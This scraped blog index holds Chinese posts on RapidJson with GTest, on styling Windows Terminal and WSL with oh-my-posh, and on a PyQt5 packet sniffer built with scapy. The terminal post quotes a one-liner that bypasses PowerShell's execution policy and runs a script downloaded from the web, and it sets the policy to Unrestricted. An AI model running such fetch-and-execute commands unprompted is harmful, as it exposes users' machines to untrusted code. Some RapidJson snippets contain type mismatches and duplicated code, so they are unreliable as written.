\u0026#34;}\u0026#34;; // 解析JSON字符串 Document doc; if (doc.Parse(jsonStr.c_str()).HasParseError()) { doc = NULL; } // ==== snip ==== return 0; } 上面这段代码中，我们对一个JSON字符串进行了解析，按照 官方文档 的说法，我们得到的是一个 Object 对象，它是DOM树的根节点：\nDOM tree 我们可以针对一个节点进行一些操作：\n#include \u0026lt;rapidjson/document.h\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace rapidjson; int main(int argc, char *atgv[]) { std::string jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; \u0026#34;}\u0026#34;; // 解析JSON字符串 Document doc; if (doc.Parse(jsonStr.c_str()).HasParseError()) { doc = NULL; } // 输出member if (doc.HasMember(\u0026#34;m1\u0026#34;) \u0026amp;\u0026amp; doc[\u0026#34;m1\u0026#34;].IsString()) { std::cout \u0026lt;\u0026lt; doc[\u0026#34;m1\u0026#34;].GetString() \u0026lt;\u0026lt; std::endl; } // ==== snip ==== return 0; } cd build cmake .. make ./test_rapid_json # afcdeb1238 Step 2.2 检查JSON合法性（lambda） 通常在业务中收到JSON数据时，可能由于这样那样的原因，少掉了一些键，或者键的类型不对。例如我们在上一步通过 doc[\u0026quot;m1\u0026quot;].GetString() 取出了 m1 的值，转化成了 std::string 进行输出，但如果 m1 不存在呢？或者 m1 不是个字符串、而是个列表呢？因此在这一步，我们要对解析后的JSON对象的合法性进行检查。\n对于一个RapidJson对象，可以使用 HasMember() 和 Isxxxx() 来检查对象的合法性，例如上面的代码在输出 m1 前使用了 HasMember 和 IsString() 来进行检查，但假如我们要检查的键变多了，每一次都要使用这样的 if 语句来进行判断，代码非常不简洁。\n检查函数的目标是，可以一次性完成合法性检验，我们把要检查的键和类型传入，函数完成检查；只要某一个键不存在、或某一个键的类型有问题，就说明JSON数据有误，返回 false 。\n我实现的代码如下：\nclass JsonObj { public: explicit JsonObj(const char *jsonStr) { if (doc.Parse(jsonStr).HasParseError()) { doc = NULL; } } bool IsNullDoc() { return doc.IsNull(); } bool Validation(const std::map\u0026lt;std::string, std::function\u0026lt;bool(const Value\u0026amp;)\u0026gt;\u0026gt; valid) const; private: Document doc; }; bool JsonObj::Validation(const std::map\u0026lt;std::string, std::function\u0026lt;bool(const Value\u0026amp;)\u0026gt;\u0026gt; valid) const { if (doc.IsNull()) { return false; } if (valid.size() == 0) { return true; } for (auto iter : valid) { if (doc.HasMember(iter.first.c_str())) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed existance check.\\n\u0026#34;; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed existance check.\\n\u0026#34;; return false; } const Value \u0026amp;memberObj = doc[iter.first.c_str()]; if (iter.second(memberObj)) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; return false; } } return true; } int main() { std::string jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; \u0026#34;}\u0026#34;; // std::cout \u0026lt;\u0026lt; jsonStr \u0026lt;\u0026lt; std::endl; JsonObj jobj(jsonStr.c_str()); std::map\u0026lt;std::string, std::function\u0026lt;bool(const Value\u0026amp;)\u0026gt;\u0026gt; valid = { {\u0026#34;m1\u0026#34;, [](const Value \u0026amp;obj) -\u0026gt; bool { return obj.IsString(); }}, {\u0026#34;m2\u0026#34;, [](const Value \u0026amp;obj) -\u0026gt; bool { return obj.IsString(); }}, {\u0026#34;list\u0026#34;, [](const Value \u0026amp;obj) -\u0026gt; bool { return obj.IsArray(); }} }; jobj.Validation(valid); return 0; } 函数接收一个 std::map ， map 的键就是要检查的键， map 的值是这个键对应的类型检查函数，类型是 std::function ；例如对于键 m1 要调用 IsString() ，而对于键 list 要调用 IsArray() 。在构造这个 map 的时候，可以使用lambda表达式来作为 std::function 的对象，函数内部将自动调用对应的lambda表达式来检查类型。\n这个实现谈不上优雅，或者简直是有点挫，因为在编写这些代码的时候还不熟悉RapidJson的其他API；但可以算作一次积极的尝试，也算是对 std::function 和lambda表达式的一次练习。\nStep 2.3 检查JSON合法性（GetType） 在官方文档 查询Object 一栏中，发现了RapidJson对于对象类型的定义和查询方法：\nstatic const char* kTypeNames[] = { \u0026#34;Null\u0026#34;, \u0026#34;False\u0026#34;, \u0026#34;True\u0026#34;, \u0026#34;Object\u0026#34;, \u0026#34;Array\u0026#34;, \u0026#34;String\u0026#34;, \u0026#34;Number\u0026#34; }; for (Value::ConstMemberIterator itr = document.MemberBegin(); itr != document.MemberEnd(); ++itr) { printf(\u0026#34;Type of member %s is %s\\n\u0026#34;, itr-\u0026gt;name.GetString(), kTypeNames[itr-\u0026gt;value.GetType()]); } Type of member hello is String Type of member t is True Type of member f is False Type of member n is Null Type of member i is Number Type of member pi is Number Type of member a is Array 可以看到，成员函数 GetType 返回的是这个对象的类型ID，而类型的名称就按照这里的 kTypeNames 的顺序定义。\n这是非常好的，对于我们的检查函数来说，我们也可以按照这样的顺序来把类型名称固定下来，检查的时候，只要检查类型名称就可以，大大提高了可读性：\nclass JsonObj { public: explicit JsonObj(const char *jsonStr) { if (doc.Parse(jsonStr).HasParseError()) { doc = NULL; } } bool IsNullDoc() { return doc.IsNull(); } bool Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const; private: Document doc; std::vector\u0026lt;std::string\u0026gt; kTypeNames = { \u0026#34;Null\u0026#34;, \u0026#34;False\u0026#34;, \u0026#34;True\u0026#34;, \u0026#34;Object\u0026#34;, \u0026#34;Array\u0026#34;, \u0026#34;String\u0026#34;, \u0026#34;Number\u0026#34; }; }; bool JsonObj::Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const { if (doc.IsNull()) { return false; } if (valid.size() == 0) { return true; } for (auto iter : valid) { if (doc.HasMember(iter.first.c_str())) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed existance check.\\n\u0026#34;; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed existance check.\\n\u0026#34;; return false; } auto typeId = doc[iter.first.c_str()].GetType(); if (kTypeNames[typeId] == iter.second) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed type check.\\n\u0026#34;; std::cout \u0026lt;\u0026lt; \u0026#34;real type: \u0026#34; \u0026lt;\u0026lt; kTypeNames[typeId] \u0026lt;\u0026lt; std::endl; return false; } } return true; } bool JsonObj::Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const { if (doc.IsNull()) { return false; } if (valid.size() == 0) { return true; } for (auto iter : valid) { if (doc.HasMember(iter.first.c_str())) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed existance check.\\n\u0026#34;; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed existance check.\\n\u0026#34;; return false; } auto typeId = doc[iter.first.c_str()].GetType(); if (kTypeNames[typeId] == iter.second) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed type check.\\n\u0026#34;; std::cout \u0026lt;\u0026lt; \u0026#34;real type: \u0026#34; \u0026lt;\u0026lt; kTypeNames[typeId] \u0026lt;\u0026lt; std::endl; return false; } } return true; } int main() { std::string jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; \u0026#34;}\u0026#34;; // std::cout \u0026lt;\u0026lt; jsonStr \u0026lt;\u0026lt; std::endl; JsonObj jobj(jsonStr.c_str()); std::map\u0026lt;std::string, std::function\u0026lt;bool(const Value\u0026amp;)\u0026gt;\u0026gt; valid = { {\u0026#34;m1\u0026#34;, \u0026#34;String\u0026#34;}, {\u0026#34;m2\u0026#34;, \u0026#34;String\u0026#34;}, {\u0026#34;list\u0026#34;, \u0026#34;Array\u0026#34;} }; jobj.Validation(valid); return 0; 由于类型检查本质上是在检查它的数值形式的 typeId ，则我们也可以把类型名称从字符串形式优化成枚举值的形式，节约存储空间和比较的时间，在这里就不多写了。\nStep 2.4 写JSON 可以使用 Writer 或 PrettyWriter 来将DOM对象转化成JSON串。\n#include \u0026#34;rapidjson/document.h\u0026#34; #include \u0026#34;rapidjson/writer.h\u0026#34; #include \u0026#34;rapidjson/prettywriter.h\u0026#34; #include \u0026#34;rapidjson/stringbuffer.h\u0026#34; #include \u0026#34;gtest/gtest.h\u0026#34; #include \u0026lt;map\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;functional\u0026gt; #include \u0026lt;vector\u0026gt; using namespace rapidjson; namespace { class JsonObj { public: JsonObj() { doc.SetObject(); } explicit JsonObj(const char *jsonStr) { if (doc.Parse(jsonStr).HasParseError()) { doc = NULL; } } template\u0026lt;typename T\u0026gt; bool AddMember(const std::string \u0026amp;key, const T \u0026amp;value); bool PrintJsonStr(); const Value\u0026amp; GetObj() { return doc.GetObject(); } private: Document doc; }; template\u0026lt;\u0026gt; bool JsonObj::AddMember(const std::string \u0026amp;key, const std::string \u0026amp;value) { if (!doc.IsObject()) { return false; } auto \u0026amp;allocator = doc.GetAllocator(); Value memKey(key.c_str(), allocator); Value memVal(value.c_str(), allocator); doc.AddMember(memKey, memVal, allocator); return true; } template\u0026lt;\u0026gt; bool JsonObj::AddMember(const std::string \u0026amp;key, const int \u0026amp;value) { if (!doc.IsObject()) { return false; } auto \u0026amp;allocator = doc.GetAllocator(); Value memKey(key.c_str(), allocator); doc.AddMember(memKey, value, allocator); return true; } template\u0026lt;\u0026gt; bool JsonObj::AddMember(const std::string \u0026amp;key, const bool \u0026amp;value) { if (!doc.IsObject()) { return false; } auto \u0026amp;allocator = doc.GetAllocator(); Value memKey(key.c_str(), allocator); doc.AddMember(memKey, value, allocator); return true; } template\u0026lt;typename T\u0026gt; bool JsonObj::AddMember(const std::string \u0026amp;key, const T \u0026amp;value) { if (!doc.IsObject()) { return false; } auto \u0026amp;allocator = doc.GetAllocator(); Value memKey(key.c_str(), allocator); Value memVal(value, allocator); doc.AddMember(memKey, memVal, allocator); return true; } bool JsonObj::PrintJsonStr() { if (!doc.IsObject()) { return false; } StringBuffer buffer; // Writer\u0026lt;StringBuffer\u0026gt; writer(buffer); PrettyWriter\u0026lt;StringBuffer\u0026gt; writer(buffer); doc.Accept(writer); std::cout \u0026lt;\u0026lt; buffer.GetString() \u0026lt;\u0026lt; std::endl; return true; } class RapidJsonTest : public testing::Test { protected: void SetUp() override {} void TearDown() override {} }; TEST_F(RapidJsonTest, TestValidation) { JsonObj obj; Document doc; auto allocator = doc.GetAllocator(); bool res; res = obj.AddMember\u0026lt;std::string\u0026gt;(\u0026#34;app_id\u0026#34;, \u0026#34;00\u0026#34;); EXPECT_TRUE(res); res = obj.AddMember\u0026lt;std::string\u0026gt;(\u0026#34;func\u0026#34;, \u0026#34;import\u0026#34;); EXPECT_TRUE(res); res = obj.AddMember\u0026lt;int\u0026gt;(\u0026#34;num\u0026#34;, 100); EXPECT_TRUE(res); Value vArray(kArrayType); for (int i = 0; i \u0026lt; 3; ++i) { Value tmp(kObjectType); tmp.AddMember(\u0026#34;m4\u0026#34;, i, allocator); tmp.AddMember(\u0026#34;m5\u0026#34;, i + 10, allocator); vArray.PushBack(tmp, allocator); } res = obj.AddMember\u0026lt;Value\u0026gt;(\u0026#34;obj_list\u0026#34;, vArray); EXPECT_TRUE(res); obj.PrintJsonStr(); } int main() { testing::InitGoogleTest(); return RUN_ALL_TESTS(); } } albusguo@AlbusGuo-PC:/mnt/d/Scripts/CPPScripts/RapidJson/build$ ./test_rapid_json Running main() from /mnt/d/Scripts/CPPScripts/RapidJson/third/googletest/src/gtest_main.cc [==========] Running 1 test from 1 test suite. [----------] Global test environment set-up. [----------] 1 test from RapidJsonTest [ RUN ] RapidJsonTest.TestValidation { \u0026#34;app_id\u0026#34;: \u0026#34;00\u0026#34;, \u0026#34;func\u0026#34;: \u0026#34;import\u0026#34;, \u0026#34;num\u0026#34;: 100, \u0026#34;obj_list\u0026#34;: [ { \u0026#34;m4\u0026#34;: 0, \u0026#34;m5\u0026#34;: 10 }, { \u0026#34;m4\u0026#34;: 1, \u0026#34;m5\u0026#34;: 11 }, { \u0026#34;m4\u0026#34;: 2, \u0026#34;m5\u0026#34;: 12 } ] } [ OK ] RapidJsonTest.TestValidation (0 ms) [----------] 1 test from RapidJsonTest (0 ms total) [----------] Global test environment tear-down [==========] 1 test from 1 test suite ran. (0 ms total) [ PASSED ] 1 test. 在上面的代码中，对 Object 额外封装了一个模板成员函数 AddMember 来添加JSON键值，但实际操作起来之后发现RapidJson在创建 Value 的时候居然要对 std::string 、 int/bool 、Array 等进行不同的操作，简直是逆天，搞得我特化了三四种模板，基本等于重载 (lll￢ω￢) 。\n不过考虑到明天上班可能还需要再参考一下今天写出来的代码，就先放到博客上吧，这部分有一点点烂尾，见谅。\n番外：RapidJson In GTest 在 开发者测试 的概念中，编码时不仅要实现业务功能，还要编写有相应的测试用例。GTest 就是一个很好的测试框架，可以帮助我们快速地完成用例编写。\n可以直接把源码拉下来，然后把仓库中 googletest 文件夹复制到cmake项目中的任意位置。\n在根目录的 CMakeLists.txt 中把GTest源码包含进项目中：\nPROJECT(TRY_RAPID_JSON) # GoogleTest requires at least C++14 set(CMAKE_CXX_STANDARD 14) set(GOOGLETEST_VERSION 1.12.1) ADD_SUBDIRECTORY(third/googletest .) ADD_SUBDIRECTORY(src .) 在源码目录的 CMakeLists.txt 中把GTest库连接到我们的程序里：\nPROJECT(TRY_RAPID_JSON) INCLUDE_DIRECTORIES(../include) ADD_EXECUTABLE(test_rapid_json main.cpp) TARGET_LINK_LIBRARIES( test_rapid_json GTest::gtest_main ) 之后就可以愉快地使用GTest了。\n对于VSCode的头文件的包含，可以参考 Step 1.2 VSCode install ，不过一键运行我没有配置，目前还是有bug的。\n在 main.cpp 里面编写测试用例：\n#include \u0026lt;rapidjson/document.h\u0026gt; #include \u0026#34;gtest/gtest.h\u0026#34; #include \u0026lt;map\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;functional\u0026gt; #include \u0026lt;vector\u0026gt; using namespace rapidjson; namespace { class JsonObj { public: explicit JsonObj(const char *jsonStr) { if (doc.Parse(jsonStr).HasParseError()) { doc = NULL; } } bool IsNullDoc() { return doc.IsNull(); } bool Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const; private: Document doc; std::vector\u0026lt;std::string\u0026gt; kTypeNames = { \u0026#34;Null\u0026#34;, \u0026#34;False\u0026#34;, \u0026#34;True\u0026#34;, \u0026#34;Object\u0026#34;, \u0026#34;Array\u0026#34;, \u0026#34;String\u0026#34;, \u0026#34;Number\u0026#34; }; }; bool JsonObj::Validation(const std::map\u0026lt;std::string, std::string\u0026gt; valid) const { if (doc.IsNull()) { return false; } if (valid.size() == 0) { return true; } for (auto iter : valid) { if (doc.HasMember(iter.first.c_str())) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed existance check.\\n\u0026#34;; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed existance check.\\n\u0026#34;; return false; } auto typeId = doc[iter.first.c_str()].GetType(); if (kTypeNames[typeId] == iter.second) { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; passed type check.\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; iter.first \u0026lt;\u0026lt; \u0026#34; failed type check.\\n\u0026#34;; std::cout \u0026lt;\u0026lt; \u0026#34;real type: \u0026#34; \u0026lt;\u0026lt; kTypeNames[typeId] \u0026lt;\u0026lt; std::endl; return false; } } return true; } class RapidJsonTest : public testing::Test { protected: void SetUp() override { jsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;ab123\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34; {\\n\u0026#34; \u0026#34; \\\u0026#34;afafa\\\u0026#34;: \\\u0026#34;alkkk\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;abcdf\\\u0026#34;: \\\u0026#34;asdqw\\\u0026#34;\\n\u0026#34; \u0026#34; }\\n\u0026#34; \u0026#34; ]\\n\u0026#34; \u0026#34;}\u0026#34;; invalidJsonStr = \u0026#34;{\\n\u0026#34; \u0026#34; \\\u0026#34;m1\\\u0026#34;: \\\u0026#34;afcdeb1238\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m2\\\u0026#34;: \\\u0026#34;1234567675\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;m3\\\u0026#34;: \\\u0026#34;sdasdqwsad\\\u0026#34;,\\n\u0026#34; \u0026#34; \\\u0026#34;list\\\u0026#34;: [\\n\u0026#34; \u0026#34;}\u0026#34;; } std::string jsonStr; std::string invalidJsonStr; }; TEST_F(RapidJsonTest, TestValidation) { // std::cout \u0026lt;\u0026lt; jsonStr \u0026lt;\u0026lt; std::endl; JsonObj jobj(jsonStr.c_str()); JsonObj invalidJobj(invalidJsonStr.c_str()); std::map\u0026lt;std::string, std::string\u0026gt; valid = { {\u0026#34;m1\u0026#34;, \u0026#34;String\u0026#34;}, {\u0026#34;m2\u0026#34;, \u0026#34;String\u0026#34;}, {\u0026#34;list\u0026#34;, \u0026#34;Array\u0026#34;} }; EXPECT_FALSE(jobj.IsNullDoc()); EXPECT_TRUE(jobj.Validation(valid)); EXPECT_TRUE(invalidJobj.IsNullDoc()); EXPECT_FALSE(invalidJobj.Validation(valid)); } int main() { testing::InitGoogleTest(); return RUN_ALL_TESTS(); } } albusguo@AlbusGuo-PC:/mnt/d/Scripts/CPPScripts/RapidJson/build$ ./test_rapid_json Running main() from /mnt/d/Scripts/CPPScripts/RapidJson/third/googletest/src/gtest_main.cc [==========] Running 1 test from 1 test suite. [----------] Global test environment set-up. [----------] 1 test from RapidJsonTest [ RUN ] RapidJsonTest.TestValidation list passed existance check. list passed type check. m1 passed existance check. m1 passed type check. m2 passed existance check. m2 passed type check. [ OK ] RapidJsonTest.TestValidation (0 ms) [----------] 1 test from RapidJsonTest (0 ms total) [----------] Global test environment tear-down [==========] 1 test from 1 test suite ran. (0 ms total) [ PASSED ] 1 test. 就可以完成函数的简单测试。\n","date":"2022-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/rapidjson%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/","title":"RapidJson使用小记"},{"content":"背景 近来发现工作 \u0026amp; 生活的时候跟Windows Terminal打的交道蛮多的，但每每打开它都眼前一黑：\nWidows terminal 于是决定对它进行一些简单的美化，让这些小细节给自己的心情增加点颜色 (●\u0026rsquo;◡\u0026rsquo;●)\nStep 1 background 对于一个又大又黑的终端来说，一个非常显著的提升颜值的办法就是换上一张自己满意的背景图片。\n点击Windows Terminal顶栏的小倒三角，进入【设置】——【Windows Powershell】——【外观】——【背景图片】，选择图片路径即可。\n再微调一下透明度，整个质感会马上提高：\nbackground image 审美各异，勿杠。\nStep 2 安装oh-my-posh oh-my-posh 是一个终端美化程序，类似MacOS终端美化常用的zsh。\n建议 不要使用 官网介绍的下载办法：\n# 错误案例： # winget winget install JanDeDobbeleer.OhMyPosh -s winget #scoop scoop install https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/oh-my-posh.json # manual Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString(\u0026#39;https://ohmyposh.dev/install.ps1\u0026#39;)) 完全不理解为什么在官网上要有这么挫的下载方式，它明明就有安装程序……国内伙伴用这个办法去下载的时候，只能说生死由命，用了梯子也不行，还得为终端配置代理，属于是没有意义的步骤。\n可以手动下载上述命令中提到的安装脚本 https://ohmyposh.dev/install.ps1 ，看一眼就知道实际上它就是到 Github release 上把安装程序下载下来而已，不是很理解为什么要用户用一个反人类的命令安装。\n因此，我们直接把对应的 installer 下到本地（访问GitHub的时候可以科学上网，或使用gitee镜像），运行，即可完成 oh-my-posh 的安装。\nStep 3 下载字体 oh-my-posh 基于 Nerd Fonts 开发，因此在使用它之前我们要先安装字体，以便正确显示特殊字符。\n到 字体下载 界面随便找一个自己满意的字体，下载到本地解压，选中所有文件右键点击安装即可。\n注意 要到Windows Terminal设置界面，进入到 Step 1 设置背景图片的地方，设置显示字体。\nStep 4 配置powershell启动项 万事俱备，接下来配置 powershell 的启动项，来使每次打开它的时候都自动运行 oh-my-posh 。\n首先 使用命令 Set-ExecutionPolicy Unrestricted 解除脚本运行限制，否则无法在启动时执行 oh-my-posh 。\n接着使用命令 echo $PROFILE 看一下自己系统上 powershell 启动项文件的路径，如果系统上不存在这个文件的话可以新建一个。\nPS C:\\Users\\10924\u0026gt; echo $PROFILE C:\\Users\\10924\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1 # 如果文件管理器找不到这个路径可以新建 # New-Item -Path $PROFILE -Type File -Force 用 notepad 或其他任何编辑器在这个文件里写上：\noh-my-posh init pwsh [--config] [主题路径] | Invoke-Expression 保存，重启 powershell 即可。\npowershell 在上面的命令中， --config [path] 是可选项，但其实最好是要写上，否则 oh-my-posh 每次运行的时候（启动和两条命令之间）都会从网络上下载主题文件，会带来若干秒的时延，这对于一个终端来说简直是炸裂。\n可以使用 Get-PoshThemes 获取所有主题，找到自己满意的主题完成设置即可。我图中的主题是 clean-detailed ，其实个人觉得观感一般，只能说聊胜于无。\nStep 5 WSL WSL其实也可以从Windows Terminal启动：\nWSL in Windows Terminal 也因此，可以通过类似的办法对WSL终端进行美化。\n设置背景图片和字体就略过，这里简单说一下如何在WSL中使用 oh-my-posh ，其实基本上是搬运 官方文档 。\nStep 5.1 posh-linux 官方提供的命令如下：\nsudo wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/posh-linux-amd64 -O /usr/local/bin/oh-my-posh sudo chmod +x /usr/local/bin/oh-my-posh 其实就是去 这个链接 把Linux版本的 oh-my-posh 下载下来，放到 /usr/local/bin 路径下。\nStep 5.2 themes 官方提供的命令如下：\nmkdir ~/.poshthemes wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zip unzip ~/.poshthemes/themes.zip -d ~/.poshthemes chmod u+rw ~/.poshthemes/*.omp.* rm ~/.poshthemes/themes.zip 其实就是去 这个链接 下载主题包，解压到自己创建的一个路径内。\n这一步和上一步，都可以在Windows系统上手动执行下载，不然同样可能遇到终端访问不了GitHub的情况。\nStep 5.3 配置启动项 类似 powershell ，WSL中的 bash 也有启动项，可以看情况选择 ~/.profile 、 ~/.bashrc 、 ~/.bash_profile 其中的一个，我以 ~/.profile 文件为例，在文件末尾加上：\neval \u0026#34;$([program-name] init bash --config \u0026#39;~/.poshthemes/clean-detailed.omp.json\u0026#39;)\u0026#34; 即可完成配置。\n注意配置当中的 [program-name] ，要写 Step 5.1 里面放到 /usr/local/bin 当中的程序名，不要写错。\n至此，我们在WSL和powershell上都完成了美化操作。\nWSL ","date":"2022-09-17T00:00:00Z","permalink":"https://xrg.fj.cn/p/windows-terminal%E7%BE%8E%E5%8C%96%E5%B0%8F%E8%AE%B0/","title":"Windows Terminal美化小记"},{"content":"PyQt5初探 自读书摘抄站点构建完成以来，一直没有进行什么有趣的实践，这回由于毕设的需要，首次尝试进行GUI编程；此外同样由于毕设需要，使用了scapy进行流量嗅探，因此就有了这一篇四不像的记录性质的文章。\nQt（音 cute ）是一套被广泛使用的GUI组件库，而 PyQt 则是这套框架与Python语言的结合，是Python中最强大的GUI库之一。\n本次选用这个框架其实经过了一定的曲折，因为Python的GUI库有太多了🤣\nTkInter ：python标准Tk GUI工具包的接口，我对这个库倒没什么成见，以前的项目使用过（虽然是队友做的），这次想换个别的库。\nPySimpleGUI ：框架主打一个简单易用，也是我最初选用的方案；接触了半个多小时之后放弃，文档属实写得像💩。\nKivy ：这个库自己还开发了一套设计语言，界面文件和程序文件分离，但只有英文文档且框架本身对中文支持不好，接触了半个多小时后放弃。\nPyQt ：以上所有库放的都是官方链接，唯独这里放的是一篇中文教程，个人觉得这位大佬翻译得不错，文档学起来是比较舒服的，遂采用。\n安装PyQt非常简单：\npip install PyQt5 pip install pyqt5-tools 还有简单易用的 Qt Designer ，可以直接通过拖拽的方式来放置控件、设计页面，牛逼格拉斯，但我准备手撸代码，因此没有尝试对它进行配置。\n环境安装完成之后，可以照着 教程 实现一些功能。\n经过一系列的探索，我的程序初具雏形：\n界面有如下几个组件：\n在线分析：启动在线流量分析。目前还没有加入“分析”的功能，仅能对流量进行实时捕捉。\n结束在线分析：顾名思义。\n打开文件：打开一个 pcap 文件，留待后续使用，主要希望将离线分析的功能也整合进来。\n大大的文本框：用于输出实时流量捕捉的内容。\n运行起来的效果如下：\n在线分析（初步） 总体实现的内容比较简单，因此后文仅对我开发过程中遇到的一些疑难杂症进行叙述。\n不过，还是需要先对本文的另一个主角 scapy 进行一些介绍。\nscapy初探 Scapy 是一套完整的网络报文操作工具，可以实现抓包、解包、构造和发送数据包等功能。\n这次将 scapy 和 PyQt5 结合，实际上只需要用到抓包的功能：\ndef StartSniff(self): self.stopSniff = False sniff(prn=self.SniffCallBack, count=0, stop_filter=self.isStop) def SniffCallBack(self, pkt: scapy.packet.Packet) -\u0026gt; None: \u0026#39;\u0026#39;\u0026#39; Do Something \u0026#39;\u0026#39;\u0026#39; def isStop(self, pkt): return self.stopSniff 可以看到，这个功能只需要调用一个 sniff() 函数，并配置如下几个参数：\nprn ：抓包的回调函数。每抓到一个数据包就会调用一次这个函数，函数有个默认参数 packet ，类型是 scapy.packet.Packet ，支持对该数据包进行一些操作。\ncount ：要捕捉的数据包个数，设置为 0 表示无限。\nstop_filter ：用于设置抓包停止的条件，当函数返回 True 时停止抓包。这个参数跟 count=0 简直是不可分割的，但网络上各教程中介绍不多，很迷惑。参数对应的是一个 函数 ，函数也默认传入 packet ，跟 prn 回调函数的用法区别不大。在这里，我将其配置为返回一个成员变量，当我希望停止抓包的时候，把这个成员变量改为 True 就行。\nPyQt和Scapy的结合：QThread和pyqtSIgnal 现在又要将思路跳回PyQt上了，记得我开发的窗口有这些按钮：\n当点击“在线分析“的时候，scapy需要开始抓包，但抓包的工作不能影响窗口本身的运行，这里就需要使用多线程 QThread 。\n主窗体的代码如下：\nclass Analyzer(QWidget): def __init__(self) -\u0026gt; None: super().__init__() # 定义用于抓包的成员 self.sniffer = Sniffer() self.initUI() def 